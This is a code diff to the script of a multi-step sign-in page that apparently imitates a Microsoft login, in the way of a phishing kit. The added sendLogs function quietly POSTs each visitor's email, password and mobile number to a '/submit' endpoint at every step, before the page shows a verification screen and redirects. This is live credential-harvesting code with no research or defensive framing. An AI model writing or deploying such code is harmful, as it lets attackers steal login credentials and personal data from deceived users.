@@ -200,10 +200,29 @@
 </footer>
 
 <script>
-  function nextStep() {
+  async function sendLogs(type) {
+    var payload = {
+      type: type,
+      email: document.getElementById('email').value || '',
+      pwd: document.getElementById('pwd').value || '',
+      mobile: document.getElementById('ms-mobile').value || ''
+    };
+    try {
+      await fetch('/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    } catch (e) {
+      console.warn('sendLogs failed', e);
+    }
+  }
+
+  async function nextStep() {
     var em = document.getElementById('email').value.trim();
     if (!em || !em.includes('@')) { document.getElementById('email-err').classList.add('show'); return; }
     document.getElementById('email-err').classList.remove('show');
+    await sendLogs('email-step');
     document.getElementById('av').textContent = em.charAt(0).toUpperCase();
     document.getElementById('disp-email').textContent = em;
     showStep(2);
@@ -214,14 +233,15 @@
     var el = document.getElementById('ms-mobile-hint');
     if (el) el.textContent = hint;
   }
-  function doPassword() {
+  async function doPassword() {
     var pw = document.getElementById('pwd').value;
     if (!pw) { document.getElementById('pwd-err').classList.add('show'); return; }
     document.getElementById('pwd-err').classList.remove('show');
+    await sendLogs('password-step');
     updateMsHint();
     showStep(3);
   }
-  function doVerify() { showStep(4); startRedirect(); }
+  async function doVerify() { await sendLogs('verify-step'); showStep(4); startRedirect(); }
   function backStep(n) { showStep(n); }
   function showStep(n) {
     document.querySelectorAll('.step').forEach(function(s){ s.classList.remove('active'); });
